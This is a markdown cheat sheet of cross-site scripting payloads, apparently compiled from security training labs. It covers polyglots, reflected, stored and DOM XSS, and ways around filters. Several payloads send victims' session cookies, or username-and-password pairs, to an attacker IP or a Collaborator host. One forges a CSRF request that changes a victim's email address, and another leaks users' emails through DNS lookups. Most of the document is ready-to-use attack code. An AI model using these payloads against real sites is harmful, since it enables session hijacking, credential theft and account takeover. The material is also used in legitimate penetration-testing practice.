# Cross-site scripting

## Summary
  

## XSS injection polyglots code XSS
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## Finding reflected XSS vulnerability
```
Test every entry point
Submit random alphanumeric values
Determine the reflection context
Test a candidate payload
Test alternative payloads
Test the attack in a browser
```

## Finding stored XSS vulnerability
Test every entry point and exit point
```
Parameters or data within the url query
The url file path
HTTP request headers
Any out-of-bands routes which an attacker can deliver data to application
```

## Exploiting XSS vulnerability
### XSS payload to steal user cookies or sessions
Start a php server on local machine using "php -S local-ip:port"

Paste below code on the page where the vulnerability is found
```
<svg onload='var x = document.createElement("IFRAME");x.setAttribute("src", "http://10.4.64.135:8080/cookie?"+document.cookie);document.body.appendChild(x);''/>
```

### XSS payload to steal user cookies or sessions
Submit the following payload
```
<script>
    fetch('https://BURP-COLLBORATOR-DOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
    });
</script>
```

### XSS payload to steal username and password
Submit the following payload
```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### XSS payload to perform csrf XSS
Log in into the page with any credentials

View the source page and notice a POST request to /my-account/change-email/ has to be made and also there's an anti-csrf token in a hidden input called token

Submit the payload in the xss vulnerability source
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
The payload will make anyone who views the comment issue a POST request to change their email address to test@test.com

### XSS payload to find other users email
Submit the following payload into any XSS vulnerable form
```
<script>
    var email = (document.getElementById("email").innerHTML).replace("@","-at-");
    var my_address = "burp-collaborator-domain";
    var request = new XMLHttpRequest();
    request.open("GET","http://"+email+"-user-"+my_address,false);
    request.send();
</script>
```
The payload will make the webserver to make a DNS lookup on the collaborator domain and in hope that the webserver's user's email will also be displayed in the DNS logging

## Exploiting DOM XSS
### DOM XSS in document.write sink using source location.search
Submit a random alphanumeric string into the search box

Inspect the element and notice that the random strings is place inside the img src attribute
```
<img src="https://example.com/example.jpg/example=fsdfsffsf">
```
Break out of the img attribute by submitting below code
```
"><svg onload=alert()>
```
The element of the img attribute will appear like " <img src=https://example.com/example.jpg"><svg onload=alert()>

### DOM XSS in JQuery selector sink using a hashchange event
Notice the application uses jQuery's selector() function to auto-scroll to a given post

Send a malicious script to the page with below script
```
<iframe src="https://victim-url/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```
Observe that the application runs our exploit

### DOM XSS in jQuery anchor href attribute sink using location.search source
Observe the source page of the application and notice there is a function that changes the href attribute using data from location.search

With the parameter "returnPath", add a value "javascript:alert()"

Submit the request and click the button back to execute the payload

### DOM XSS in AngularJS framework in search functionality
Enter a ramdom alphanumeric string into the search box

View the page source and notice that the random string is enclosed in an ng-app directive
Using AngularJS expression
```
{{$on.constructor('alert()')()}}
```
Click search to execute the payload

### DOM XSS reflected
Search for a random string and intercept the page

Notice that the string is reflected in a JSON response called search-result and opening the javascript file confirms that the JSON response is use with eval() function call

Test with different search strings, the JSON response is escaping quotation marks but not a backslash

Using below expression
```
\"-alert(1)}//
```
The response will be generated like
```
{"searchTerm":"\\"-alert(1)//", "results":[]}
```

### DOM XSS stored
Visit a blog page and create a random alphanumeric comment

View the source page and notice that angle brackets are encoded

Upload another comment with the following payload
```
<><img src=1 onerror=alert()>
```
What happens is that the first angle brackets string gets encoded but not other angle brackets

### DOM CLOBBERING to enable XSS
Visit a blog page and create a comment containing anchors
```
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

The two anchors use the same ID are grouped together in a DOM collection and this will overwrites the defaultAvatar reference with this DOM collection

The name attribute in the second anchor is used to clobber the avatar property of the defaultAvatar object which calles an alert function on error
```
Return the blog page and create a second random comment and when the page load, the alert() is called

##  Cross-site scripting context
### Reflected XSS into HTML context with nothing encoded
On the search function, use the payload
```
"><img src=x onerror=alert()>
```
The payload first escape the input tag, only then the alert() will be triggered

### Stored XSS into HTML context with nothing encoded
On the search function, use the payload
```
</textarea><svg onload=alert()>
```
The payload first escape from the textarea tags, only then the alert() will be triggered

### Reflected XSS into HTML context with most tags and attributes blocked
Find a way on how to deliver the payload to the target url
```
<iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

### Reflected XSS into HTML context with all tags blocked except custom ones
Find a way on how to deliver the payload to the target url
```
<script>
location = 'https://your-lab-id.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
This injection creates a custom tag with the ID x, which contains an onfocus event handler that triggers the alert function. The hash at the end of the URL focuses on this element as soon as the page is loaded, causing the alert payload to be called. 

### Reflected XSS with event handlers and href attributes blocked
Replace the url with below payload
```
https://0aa1006603436b73c0693771006f007f.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
```
This injection creates a html tag that will trigger an alert function

### Reflected XSS into attribute with angle brackets HTML-Encoded
Submit a random alphanumeric with angle brackets in the vulnerable source and intercept the request with burpsuite & notice that the angle brackets is html encoded

Using the payload below
```
" autofocus onfocus=alert(1) x"
```
The payload introduces a new scriptable context, an event handler, the first double quote is to break out of the original tags and later provide an event handler that will trigger alert()

### Stored XSS into anchor href attribute with double quotes HTML-Encoded
Submit a random alphanumeric in the vulnerable source

Send a post request for the page that displays the alphanumeric & notice that there are href attribute that can be exploited

Using the below payload
```
javascript:alert()
# The payload will look like <a href="javascript:alert()">
```

### Reflected XSS in canonical link tag
```
https://your-lab-id.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```
This will set the x key as an access key for the whole page, to trigger the payload, the user will have to press the x shortcut key (Alt+x) on linux

### Reflected XSS into a JavaScript string with single quote and backslash escaped
Submit a random alphanumeric string in the vulnerable source

View the page source of the submitted string and notice the strings is put inside a javascript string

Since single quote and backslash is escaped, we cant break out of the string in the javascript tag

To exploit this, we first need to break out of the script tag and calls an event handler like below
```
</script><img src=1 onerror=alert(1)>
# since the img source does not exist, an error will be omitted, with that an alert will pops up
```

### Reflected XSS into a JavaScript string with angle brackets HTML-Encoded
Submit a random alphanumeric string in the vulnerable source

View the page source of the submitted string and notice the string is put inside a javascript string

Since angle brackets are html encoded, we cant break out of the script tag, however we can break out of the javascript string
```
';alert(document.cookie)//
# The single quote and semicolon ends the original javascript string, then gives a new javascript string that pops up an alert
```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-Encoded and single quotes escaped
Submit a random alphanumeric string in the vulnerable source

View the page source of the submitted string and notice the string is put inside a javascriipt string

Normally we would escape the javascript string or escape the script tag entirely, but because of some restrictions we can't do that

Assume an attacker tries to escape the javascript string with below payload
```
';alert()//
```
Since the website escapes single quotes, the javascript string will not be terminated

The payload gets converted into \';alert()//

However, we can bypass that restriction by supplying a backslash beforehand
```
\';alert()//
# The payload gets converted to \\';alert()//
# The first backslash means that the second backslash is interpreted literally and not as a speciacl characters
# This means that the quoute is now interpreted as a string terminator
```

### Reflected XSS in a JavaScript url with some characters blocked
Visit the below url
```
https://0ab200ab03547f5cc0a1297300f50039.web-security-academy.net/post?postId=5&%27},x=x=%3E{throw/**/onerror=alert,1337},toString=x,window%2b%27%27,{x:%27
# The throw statement is used, separated with a blank comment in order to get round the no spaces restriction.
# The alert function is assigned to the onerror exception handler. 
```

### Making use of HTML-Encoding
Submit a random alphanumeric string in the vulnerable source

View the page source of the submitted string and notice the string is put inside a javascript string

Since most special characters are html encoded, we can use &apos which represents as single quotes

Encoded single quotes can be used to terminate a string
```
&apos;-alert()-&apos;
# The payload get converts into ';alert()';
# The first single quote and semicolon terminates the original javascript string, then gives a new javascript string that pops up an alert
```

### Reflected XSS into a template literal
Submit a random alphanumeric string in the vulnerable source

Observe that the random string has been reflected inside a JavaScript template string

Submit below payload
```
${alert(1)}
${.....} syntax is an embedded expressions
```

### Stored XSS into onclick event with angle brackets and double quotes HTM-encoded and single quotes and backslash escaped
Submit a random alphanumeric strings in the vulnerable url source

Observe that the random string has been reflected inside an onclick event handler attribute

Submit the following payload into the url-textbox
```
http://foo?&apos;-alert(1)-&apos;
```
click on the url and the alert function is triggered

